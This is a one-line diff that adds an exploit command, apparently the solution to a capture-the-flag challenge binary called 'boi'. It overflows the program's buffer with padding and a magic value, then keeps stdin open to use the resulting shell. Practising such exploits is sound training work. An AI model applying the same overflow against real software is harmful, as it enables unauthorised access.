@@ -1,0 +1,1 @@
+(python -c "print 'A'*20 + '\xee\xba\xf3\xca'" ;cat) |./boi
